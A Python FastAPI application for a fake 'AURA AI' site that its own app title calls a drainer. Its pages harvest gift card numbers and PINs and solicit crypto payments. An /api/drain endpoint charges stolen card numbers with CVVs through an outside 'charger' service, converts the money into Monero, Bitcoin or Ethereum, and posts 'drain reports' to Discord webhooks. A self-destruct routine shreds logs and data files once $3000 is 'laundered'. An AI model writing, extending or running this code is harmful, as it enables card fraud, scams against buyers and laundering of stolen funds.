import os
import json
import random
import httpx
import shutil
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException, Form
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, field_validator
from dotenv import load_dotenv
import jinja2

load_dotenv()

# ---------- Configuration ----------
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK", "")
DISCORD_WEBHOOK_FALLBACK = os.getenv("DISCORD_WEBHOOK_FALLBACK", "")
XMR_WALLET = os.getenv("XMR_WALLET", "")
BTC_WALLET = os.getenv("BTC_WALLET", "")
ETH_WALLET = os.getenv("ETH_WALLET", "")
CHARGER_URL = os.getenv("CHARGER_URL", "")
CHARGER_KEY = os.getenv("CHARGER_KEY", "")
FIXEDFLOAT_API_KEY = os.getenv("FIXEDFLOAT_API_KEY", "")
FIXEDFLOAT_SECRET = os.getenv("FIXEDFLOAT_SECRET", "")
BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")

# ---------- Logging ----------
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler('app.log', maxBytes=10*1024*1024, backupCount=5)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)
console = logging.StreamHandler()
console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(console)

# ---------- Storage ----------
DATA_FILE = "data.json"
TEMP_FILE = "data.json.tmp"

def read_storage():
    if not os.path.exists(DATA_FILE):
        default = {"total": 0.0, "processed": [], "gift_cards": [], "crypto_txs": [], "withdrawals": []}
        write_storage(default)
        return default
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Storage read error: {e}, recreating")
        default = {"total": 0.0, "processed": [], "gift_cards": [], "crypto_txs": [], "withdrawals": []}
        write_storage(default)
        return default

def write_storage(data: dict):
    with open(TEMP_FILE, "w") as f:
        json.dump(data, f, indent=2)
        f.flush()
        os.fsync(f.fileno())
    os.replace(TEMP_FILE, DATA_FILE)

storage = read_storage()
total_laundered = storage.get("total", 0.0)
processed_ids = set(storage.get("processed", []))
gift_cards = storage.get("gift_cards", [])
crypto_txs = storage.get("crypto_txs", [])
withdrawals = storage.get("withdrawals", [])

# ---------- Pydantic Models ----------
class CardPayload(BaseModel):
    cardNumber: str
    exp: str
    cvv: str
    amount: float
    cardholder: str = "User"
    crypto: str = "XMR"
    order_id: str

    @field_validator('cardNumber')
    def validate_card(cls, v):
        if not v.replace(" ", "").isdigit():
            raise ValueError("Card number must be numeric")
        return v

    @field_validator('exp')
    def validate_exp(cls, v):
        if "/" not in v:
            raise ValueError("Expiry format MM/YY")
        return v

    @field_validator('crypto')
    def validate_crypto(cls, v):
        if v not in ["XMR", "BTC", "ETH"]:
            raise ValueError("Crypto must be XMR, BTC, or ETH")
        return v

# ---------- FastAPI App ----------
app = FastAPI(title="AURA AI + Drainer")

# ---------- Jinja2 Templates – Futuristic Space Theme ----------
TEMPLATES = {
    "base.html": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}AURA AI{% endblock %}</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Rajdhani', sans-serif;
            background: #0a0a1a;
            color: #e0e0ff;
            min-height: 100vh;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(10, 10, 40, 0.8) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 20%, rgba(20, 20, 60, 0.6) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 80%, rgba(40, 0, 80, 0.3) 0%, transparent 50%),
                linear-gradient(180deg, #0a0a1a 0%, #0d0d2b 50%, #0a0a1a 100%);
            background-attachment: fixed;
        }
        /* Animated stars */
        .stars {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
            background-image: 
                radial-gradient(2px 2px at 5% 10%, #fff, transparent),
                radial-gradient(2px 2px at 15% 30%, #eee, transparent),
                radial-gradient(1px 1px at 25% 5%, #fff, transparent),
                radial-gradient(2px 2px at 35% 70%, rgba(255,255,255,0.8), transparent),
                radial-gradient(1px 1px at 45% 20%, #fff, transparent),
                radial-gradient(2px 2px at 55% 80%, #eee, transparent),
                radial-gradient(1px 1px at 65% 15%, #fff, transparent),
                radial-gradient(2px 2px at 75% 60%, rgba(255,255,255,0.7), transparent),
                radial-gradient(1px 1px at 85% 40%, #fff, transparent),
                radial-gradient(2px 2px at 95% 90%, #eee, transparent);
            background-size: 200px 200px;
            animation: twinkle 5s ease-in-out infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        nav {
            background: rgba(10, 10, 30, 0.7);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-bottom: 1px solid rgba(0, 255, 255, 0.15);
            padding: 15px 0;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
        }
        nav .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        nav .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.8rem;
            font-weight: 900;
            text-decoration: none;
            background: linear-gradient(135deg, #00ffff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            letter-spacing: 3px;
        }
        nav ul {
            list-style: none;
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
        }
        nav ul a {
            color: #b0b0ff;
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1rem;
            transition: 0.3s;
            letter-spacing: 1px;
            position: relative;
            padding-bottom: 4px;
        }
        nav ul a:hover {
            color: #00ffff;
            text-shadow: 0 0 12px rgba(0, 255, 255, 0.4);
        }
        nav ul a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0%;
            height: 2px;
            background: #00ffff;
            transition: 0.3s;
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
        }
        nav ul a:hover::after {
            width: 100%;
        }
        .hero {
            text-align: center;
            padding: 60px 0 40px;
            background: radial-gradient(ellipse at center, rgba(0, 255, 255, 0.05) 0%, transparent 70%);
            border-bottom: 1px solid rgba(0, 255, 255, 0.05);
            margin-bottom: 20px;
        }
        .hero h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00ffff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
            margin-bottom: 20px;
            letter-spacing: 4px;
        }
        .hero p {
            font-size: 1.3rem;
            color: #b0b0ff;
            max-width: 700px;
            margin: 0 auto 30px;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            padding: 14px 40px;
            background: linear-gradient(135deg, #00ffff, #0088ff);
            color: #0a0a1a;
            font-weight: 700;
            border-radius: 50px;
            text-decoration: none;
            transition: 0.3s;
            border: none;
            cursor: pointer;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.1rem;
            letter-spacing: 1px;
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
            text-transform: uppercase;
        }
        .btn:hover {
            transform: scale(1.05) translateY(-2px);
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.6);
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.06);
            color: #00ffff;
            border: 1px solid rgba(0, 255, 255, 0.3);
            box-shadow: none;
        }
        .btn-secondary:hover {
            background: rgba(0, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
        }
        .features {
            padding: 40px 0;
        }
        .features .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            margin-top: 20px;
        }
        .feature {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px 20px;
            border-radius: 16px;
            border: 1px solid rgba(0, 255, 255, 0.08);
            transition: 0.4s;
            text-align: center;
        }
        .feature:hover {
            transform: translateY(-8px);
            border-color: rgba(0, 255, 255, 0.3);
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.05);
            background: rgba(0, 255, 255, 0.02);
        }
        .feature h3 {
            font-size: 1.6rem;
            color: #00ffff;
            margin-bottom: 10px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
        }
        .feature p {
            color: #b0b0ff;
            font-size: 1rem;
        }
        .pricing-grid {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin: 30px 0;
            flex-wrap: wrap;
        }
        .plan {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px 25px;
            border-radius: 16px;
            border: 1px solid rgba(0, 255, 255, 0.08);
            text-align: center;
            min-width: 260px;
            transition: 0.4s;
            flex: 1 1 250px;
        }
        .plan:hover {
            border-color: rgba(0, 255, 255, 0.4);
            box-shadow: 0 0 60px rgba(0, 255, 255, 0.05);
        }
        .plan.featured {
            border-color: #00ffff;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
        }
        .plan h2 {
            font-family: 'Orbitron', sans-serif;
            color: #00ffff;
            font-size: 1.8rem;
            margin-bottom: 10px;
        }
        .plan p.price {
            font-size: 1.8rem;
            color: #b0b0ff;
            margin: 15px 0;
            font-weight: 600;
        }
        .plan ul {
            list-style: none;
            padding: 0;
            margin: 20px 0;
            color: #b0b0ff;
        }
        .plan ul li {
            padding: 5px 0;
            font-size: 1rem;
        }
        .plan .btn {
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: rgba(255,255,255,0.02);
            border-radius: 12px;
            overflow: hidden;
        }
        table th, table td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            text-align: left;
            color: #d0d0ff;
        }
        table th {
            background: rgba(0, 255, 255, 0.08);
            color: #00ffff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 400;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        table tr:hover {
            background: rgba(0, 255, 255, 0.02);
        }
        form {
            max-width: 500px;
            margin: 0 auto;
        }
        form label {
            display: block;
            margin: 20px 0 6px;
            color: #b0b0ff;
            letter-spacing: 1px;
            font-weight: 500;
        }
        form input, form select {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(0, 255, 255, 0.15);
            border-radius: 8px;
            color: #e0e0ff;
            font-size: 1rem;
            transition: 0.3s;
            font-family: 'Rajdhani', sans-serif;
        }
        form input:focus, form select:focus {
            outline: none;
            border-color: #00ffff;
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.1);
            background: rgba(0, 255, 255, 0.02);
        }
        .crypto-box {
            background: rgba(0, 255, 255, 0.05);
            padding: 20px;
            border-radius: 12px;
            border: 1px solid rgba(0, 255, 255, 0.15);
            margin: 20px 0;
            text-align: center;
            transition: 0.3s;
        }
        .crypto-box:hover {
            border-color: #00ffff;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
        }
        .crypto-box h3 {
            color: #00ffff;
            font-family: 'Orbitron', sans-serif;
            font-weight: 400;
            word-break: break-all;
            font-size: 1.2rem;
        }
        .crypto-box h3 span {
            font-family: 'Rajdhani', sans-serif;
            font-weight: 300;
            color: #c0c0ff;
            word-break: break-all;
        }
        footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 60px;
            border-top: 1px solid rgba(0, 255, 255, 0.05);
            color: #555;
            font-size: 0.9rem;
            font-weight: 300;
        }
        .error { color: #ff6b6b; }
        .success { color: #00ff88; }
        @media (max-width: 768px) {
            nav .container { flex-direction: column; gap: 10px; }
            nav ul { justify-content: center; gap: 15px; }
            .hero h1 { font-size: 2.2rem; }
            .pricing-grid { flex-direction: column; align-items: center; }
        }
    </style>
</head>
<body>
    <div class="stars"></div>
    <nav>
        <div class="container">
            <a href="/" class="logo">AURA AI</a>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/pricing">Pricing</a></li>
                <li><a href="/about">About</a></li>
                <li><a href="/admin">Admin</a></li>
            </ul>
        </div>
    </nav>
    <main>
        <div class="container">
        {% block content %}{% endblock %}
        </div>
    </main>
    <footer>
        <p>&copy; 2077 AURA AI – Interstellar Intelligence</p>
    </footer>
</body>
</html>""",

    "index.html": """{% extends "base.html" %}
{% block title %}AURA AI – Next‑Gen Intelligence{% endblock %}
{% block content %}
<section class="hero">
    <h1>Unlock the Future with AURA AI</h1>
    <p>We provide cutting‑edge AI solutions for businesses and individuals.</p>
    <a href="/pricing" class="btn">Get Started</a>
</section>
<section class="features">
    <h2 style="text-align:center; font-family:'Orbitron',sans-serif; color:#00ffff; font-size:2rem; margin-bottom:20px;">Why Choose Us?</h2>
    <div class="grid">
        <div class="feature"><h3>⚡ Lightning Speed</h3><p>Real‑time processing.</p></div>
        <div class="feature"><h3>🔒 Secure & Private</h3><p>Encrypted and private.</p></div>
        <div class="feature"><h3>💳 Flexible Payments</h3><p>Gift cards & crypto accepted.</p></div>
    </div>
</section>
{% endblock %}""",

    "pricing.html": """{% extends "base.html" %}
{% block title %}Pricing – AURA AI{% endblock %}
{% block content %}
<section class="hero" style="padding:40px 0;">
    <h1 style="font-size:2.8rem;">Choose Your Plan</h1>
</section>
<div class="pricing-grid">
    <div class="plan">
        <h2>Starter</h2>
        <p class="price">$49/month</p>
        <ul><li>10 API calls/day</li><li>Basic analytics</li></ul>
        <a href="/pay/gift" class="btn">Pay with Gift Card</a>
        <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
    </div>
    <div class="plan featured">
        <h2>Pro</h2>
        <p class="price">$199/month</p>
        <ul><li>100 API calls/day</li><li>Advanced analytics</li><li>Priority support</li></ul>
        <a href="/pay/gift" class="btn">Pay with Gift Card</a>
        <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
    </div>
</div>
{% endblock %}""",

    "gift.html": """{% extends "base.html" %}
{% block title %}Pay with Gift Card{% endblock %}
{% block content %}
<section class="hero" style="padding:40px 0;">
    <h1 style="font-size:2.8rem;">Submit Your Gift Card</h1>
</section>
<form id="gift-form">
    <label>Card Type</label>
    <select name="card_type" required>
        <option value="amazon">Amazon</option>
        <option value="steam">Steam</option>
        <option value="visa">Visa Gift</option>
        <option value="other">Other</option>
    </select>
    <label>Card Number</label>
    <input type="text" name="card_number" placeholder="Enter code/numbers" required>
    <label>PIN (if any)</label>
    <input type="text" name="card_pin" placeholder="PIN code">
    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Submit</button>
</form>
<div id="gift-result" style="margin-top:20px; text-align:center;"></div>
<script>
document.getElementById('gift-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = new FormData(e.target);
    const resp = await fetch('/pay/gift', { method: 'POST', body: form });
    const data = await resp.json();
    document.getElementById('gift-result').innerHTML = `<span class="${data.error ? 'error' : 'success'}">${data.message || data.error}</span>`;
});
</script>
{% endblock %}""",

    "crypto.html": """{% extends "base.html" %}
{% block title %}Pay with Crypto{% endblock %}
{% block content %}
<section class="hero" style="padding:40px 0;">
    <h1 style="font-size:2.8rem;">Pay with Cryptocurrency</h1>
    <p style="font-size:1.2rem;">Send your crypto to one of the addresses below.</p>
</section>
<div class="crypto-box">
    <h3>BTC: <span>{{ btc_wallet }}</span></h3>
</div>
<div class="crypto-box">
    <h3>ETH: <span>{{ eth_wallet }}</span></h3>
</div>
<div class="crypto-box">
    <h3>XMR: <span>{{ xmr_wallet }}</span></h3>
</div>
<p style="text-align:center; margin:20px 0;">After sending, fill in the details below to confirm.</p>
<form id="crypto-form">
    <label>Currency</label>
    <select name="currency">
        <option value="BTC">Bitcoin</option>
        <option value="ETH">Ethereum</option>
        <option value="XMR">Monero</option>
    </select>
    <label>Amount Sent</label>
    <input type="number" step="0.00000001" name="amount" required>
    <label>Your Sending Address</label>
    <input type="text" name="source_address" placeholder="0x... or address">
    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Confirm Payment</button>
</form>
<div id="crypto-result" style="margin-top:20px; text-align:center;"></div>
<script>
document.getElementById('crypto-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const form = new FormData(e.target);
    const resp = await fetch('/pay/crypto', { method: 'POST', body: form });
    const data = await resp.json();
    document.getElementById('crypto-result').innerHTML = `<span class="${data.error ? 'error' : 'success'}">${data.message || data.error}</span>`;
});
</script>
{% endblock %}""",

    "admin.html": """{% extends "base.html" %}
{% block title %}Admin Dashboard{% endblock %}
{% block content %}
<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; flex-wrap:wrap;">
    <h1 style="font-family:'Orbitron',sans-serif; color:#00ffff;">Dashboard</h1>
    <a href="/admin/logout" class="btn btn-secondary" style="padding:8px 25px;">Logout</a>
</div>
<h2 style="color:#00ffff; margin-top:30px;">Gift Cards</h2>
<table>
    <tr><th>ID</th><th>Type</th><th>Number</th><th>PIN</th></tr>
    {% for card in gift_cards %}
    <tr><td>{{ card.id }}</td><td>{{ card.type }}</td><td>{{ card.number[:10] }}...</td><td>{{ card.pin or 'N/A' }}</td></tr>
    {% endfor %}
</table>
<h2 style="color:#00ffff; margin-top:30px;">Crypto Transactions</h2>
<table>
    <tr><th>ID</th><th>Currency</th><th>Amount</th><th>USD Value</th><th>Status</th><th>Source</th></tr>
    {% for tx in crypto_txs %}
    <tr><td>{{ tx.id }}</td><td>{{ tx.currency }}</td><td>{{ tx.amount }}</td><td>${{ tx.usd|round(2) }}</td><td>{{ tx.status }}</td><td>{{ tx.source[:10] }}...</td></tr>
    {% endfor %}
</table>
<h2 style="color:#00ffff; margin-top:30px;">Withdrawals</h2>
<table>
    <tr><th>ID</th><th>Amount (USD)</th><th>Method</th><th>Status</th></tr>
    {% for w in withdrawals %}
    <tr><td>{{ w.id }}</td><td>${{ w.amount|round(2) }}</td><td>{{ w.method }}</td><td>{{ w.status }}</td></tr>
    {% endfor %}
</table>
<h2 style="color:#00ffff; margin-top:30px;">Drainer Stats</h2>
<p><strong style="color:#b0b0ff;">Total Laundered:</strong> <span style="color:#00ff88;">${{ total_laundered|round(2) }}</span></p>
<p><strong style="color:#b0b0ff;">Processed Orders:</strong> <span style="color:#00ff88;">{{ processed_count }}</span></p>
{% endblock %}""",

    "about.html": """{% extends "base.html" %}
{% block title %}About Us{% endblock %}
{% block content %}
<section class="hero" style="padding:40px 0;">
    <h1 style="font-size:2.8rem;">About AURA AI</h1>
    <p style="font-size:1.2rem;">We are a next‑generation AI research lab, pushing the boundaries of intelligence.</p>
</section>
{% endblock %}""",

    "admin_login.html": """{% extends "base.html" %}
{% block title %}Admin Login{% endblock %}
{% block content %}
<section class="hero" style="padding:40px 0;">
    <h1 style="font-size:2.8rem;">Admin Access</h1>
</section>
<form method="post">
    <label>Username</label>
    <input type="text" name="username" required>
    <label>Password</label>
    <input type="password" name="password" required>
    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Login</button>
    {% if error %}<p class="error" style="text-align:center; margin-top:15px;">{{ error }}</p>{% endif %}
</form>
{% endblock %}"""
}

# ---------- Jinja2 Environment (caching fully disabled) ----------
env = jinja2.Environment(loader=jinja2.DictLoader(TEMPLATES), auto_reload=True)
env.cache = None

def render_template(template_name: str, context: dict = None):
    if context is None:
        context = {}
    template = env.get_template(template_name)
    return HTMLResponse(template.render(context))

# ---------- Global Exception Handler ----------
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={"detail": str(exc), "path": request.url.path}
    )

# ---------- Routes ----------
@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return render_template("index.html", {"request": request})

@app.get("/pricing", response_class=HTMLResponse)
async def pricing(request: Request):
    return render_template("pricing.html", {"request": request})

@app.get("/about", response_class=HTMLResponse)
async def about(request: Request):
    return render_template("about.html", {"request": request})

@app.get("/pay/gift", response_class=HTMLResponse)
async def pay_gift_page(request: Request):
    return render_template("gift.html", {"request": request})

@app.post("/pay/gift")
async def pay_gift(request: Request):
    form = await request.form()
    card_type = form.get("card_type")
    card_number = form.get("card_number")
    card_pin = form.get("card_pin", "")
    if not card_number:
        return JSONResponse({"error": "Card number required"}, status_code=400)
    storage = read_storage()
    gift_cards = storage.get("gift_cards", [])
    gift_cards.append({
        "id": len(gift_cards)+1,
        "type": card_type,
        "number": card_number,
        "pin": card_pin
    })
    storage["gift_cards"] = gift_cards
    write_storage(storage)
    logger.info(f"Gift card submitted: {card_type} - {card_number[-4:]}")
    return JSONResponse({"message": "Gift card accepted! We'll process it shortly."})

@app.get("/pay/crypto", response_class=HTMLResponse)
async def pay_crypto_page(request: Request):
    # Pass actual wallet addresses from env
    context = {
        "request": request,
        "btc_wallet": BTC_WALLET,
        "eth_wallet": ETH_WALLET,
        "xmr_wallet": XMR_WALLET
    }
    return render_template("crypto.html", context)

@app.post("/pay/crypto")
async def pay_crypto(request: Request):
    form = await request.form()
    currency = form.get("currency", "BTC")
    try:
        amount = float(form.get("amount", 0))
    except:
        return JSONResponse({"error": "Invalid amount"}, status_code=400)
    source = form.get("source_address", "")
    if amount <= 0:
        return JSONResponse({"error": "Amount must be > 0"}, status_code=400)
    price = 60000 if currency == "BTC" else 3000 if currency == "ETH" else 1
    usd_value = amount * price
    usd_received = usd_value * 0.99
    storage = read_storage()
    crypto_txs = storage.get("crypto_txs", [])
    tx_id = len(crypto_txs)+1
    crypto_txs.append({
        "id": tx_id,
        "currency": currency,
        "amount": amount,
        "usd": usd_received,
        "status": "converted",
        "source": source
    })
    storage["crypto_txs"] = crypto_txs
    withdrawals = storage.get("withdrawals", [])
    withdrawals.append({
        "id": len(withdrawals)+1,
        "amount": usd_received,
        "method": "bank_wire",
        "status": "pending"
    })
    storage["withdrawals"] = withdrawals
    write_storage(storage)
    logger.info(f"Crypto payment: {amount} {currency} -> ${usd_received}")
    return JSONResponse({"message": f"Received {amount} {currency} (~${usd_received:.2f}) – processing complete."})

@app.get("/admin", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    return render_template("admin_login.html", {"request": request})

@app.post("/admin")
async def admin_login(request: Request):
    form = await request.form()
    username = form.get("username")
    password = form.get("password")
    if username == ADMIN_USER and password == ADMIN_PASS:
        context = {
            "request": request,
            "gift_cards": read_storage().get("gift_cards", []),
            "crypto_txs": read_storage().get("crypto_txs", []),
            "withdrawals": read_storage().get("withdrawals", []),
            "total_laundered": read_storage().get("total", 0.0),
            "processed_count": len(read_storage().get("processed", []))
        }
        response = render_template("admin.html", context)
        response.set_cookie(key="admin", value="true", httponly=True)
        return response
    else:
        return render_template("admin_login.html", {"request": request, "error": "Invalid credentials"})

@app.get("/admin/dashboard")
async def admin_dashboard(request: Request):
    if request.cookies.get("admin") != "true":
        return render_template("admin_login.html", {"request": request, "error": "Please login"})
    storage = read_storage()
    context = {
        "request": request,
        "gift_cards": storage.get("gift_cards", []),
        "crypto_txs": storage.get("crypto_txs", []),
        "withdrawals": storage.get("withdrawals", []),
        "total_laundered": storage.get("total", 0.0),
        "processed_count": len(storage.get("processed", []))
    }
    return render_template("admin.html", context)

@app.get("/admin/logout")
async def admin_logout():
    response = JSONResponse({"message": "Logged out"})
    response.delete_cookie("admin")
    return response

# ---------- Discord & Crypto ----------
async def send_discord(message: str, color=0x00ff00):
    embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
    try:
        httpx.post(DISCORD_WEBHOOK, json=embeds, timeout=10)
    except Exception as e:
        logger.warning(f"Primary webhook failed: {e}")
        if DISCORD_WEBHOOK_FALLBACK:
            try:
                httpx.post(DISCORD_WEBHOOK_FALLBACK, json=embeds, timeout=10)
            except Exception as e2:
                logger.error(f"Fallback webhook also failed: {e2}")

async def buy_crypto(crypto: str, amount_usd: float):
    wallet_map = {"XMR": XMR_WALLET, "BTC": BTC_WALLET, "ETH": ETH_WALLET}
    dest = wallet_map.get(crypto)
    if not dest:
        logger.error(f"No wallet for {crypto}")
        return
    payload = {
        "fromCurrency": "USD",
        "toCurrency": crypto,
        "amount": str(amount_usd),
        "type": "direct",
        "destinationAddress": dest,
        "apiKey": FIXEDFLOAT_API_KEY,
        "secret": FIXEDFLOAT_SECRET
    }
    async with httpx.AsyncClient() as client:
        try:
            resp = await client.post("https://api.fixedfloat.com/v2/createOrder", json=payload, timeout=15)
            if resp.status_code == 200:
                logger.info(f"Crypto success: {resp.text[:200]}")
                await send_discord(f"✅ Crypto purchase successful")
            else:
                logger.error(f"Crypto failed: {resp.text}")
                await send_discord(f"⚠️ Crypto purchase failed (HTTP {resp.status_code})")
        except Exception as e:
            logger.error(f"Crypto exception: {e}")
            await send_discord(f"❌ Crypto exception: {str(e)}")

def charge_card(card_data: dict) -> bool:
    try:
        exp_parts = card_data["exp"].split("/")
        month = exp_parts[0].strip()
        year = "20" + exp_parts[1].strip() if len(exp_parts[1]) == 2 else exp_parts[1]
    except:
        return False
    payload = {
        "cc": card_data["cardNumber"].replace(" ", ""),
        "month": month,
        "year": year,
        "cvv": card_data["cvv"],
        "amount": str(card_data["amount"]),
        "holder": card_data.get("cardholder", "User"),
        "currency": "USD"
    }
    try:
        r = httpx.post(CHARGER_URL, json=payload, headers={"x-api-key": CHARGER_KEY}, timeout=20)
        resp = r.json()
        success = resp.get("status") in ["success", "approved", "charged"]
        logger.info(f"Charge {card_data['cardNumber'][-4:]}: {success}")
        return success
    except Exception as e:
        logger.error(f"Charge exception: {e}")
        return False

def secure_delete(path):
    try:
        with open(path, "ba+") as f:
            length = f.tell()
            f.seek(0)
            f.write(os.urandom(length))
        os.remove(path)
    except:
        pass

def self_destruct():
    import asyncio
    asyncio.run(send_discord("🔥 SITE REACHED $3000 — SELF DESTRUCTING", color=0xff0000))
    for root, dirs, files in os.walk("."):
        for f in files:
            if f.endswith((".log", ".json", ".db", ".pyc")):
                secure_delete(os.path.join(root, f))
    shutil.rmtree("__pycache__", ignore_errors=True)
    logger.critical("SITE DESTROYED")
    os._exit(0)

@app.post("/api/drain")
async def drain(request: Request):
    global total_laundered, processed_ids
    try:
        data = await request.json()
        payload = CardPayload(**data)
    except Exception as e:
        logger.warning(f"Invalid payload: {e}")
        raise HTTPException(status_code=400, detail=str(e))

    if payload.order_id in processed_ids:
        logger.warning(f"Duplicate order {payload.order_id}")
        return {"success": False, "message": "Duplicate order_id"}

    if total_laundered >= BURN_THRESHOLD:
        return {"success": False, "message": "Service disabled"}

    if charge_card(payload.dict()):
        total_laundered += payload.amount
        processed_ids.add(payload.order_id)
        storage = read_storage()
        storage["total"] = total_laundered
        storage["processed"] = list(processed_ids)
        write_storage(storage)

        import asyncio
        asyncio.create_task(buy_crypto(payload.crypto, payload.amount))

        msg = f"**Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nCrypto: {payload.crypto}\nTotal: ${total_laundered:.2f}"
        asyncio.create_task(send_discord(msg))

        if total_laundered >= BURN_THRESHOLD:
            self_destruct()

        return {"success": True, "order_id": payload.order_id}
    else:
        asyncio.create_task(send_discord(f"❌ Failed — Order {payload.order_id}"))
        return {"success": False, "message": "Charge failed"}

@app.get("/burn")
async def manual_burn(token: str = None):
    if token != BURN_SECRET:
        raise HTTPException(status_code=401, detail="Unauthorized")
    self_destruct()
    return {"status": "burned"}

@app.get("/health")
async def health():
    return {"status": "running", "total_laundered": total_laundered}

# ---------- Main ----------
if __name__ == "__main__":
    import uvicorn
    port_str = os.getenv("PORT", "1337")
    port = int(port_str) if port_str else 1337
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")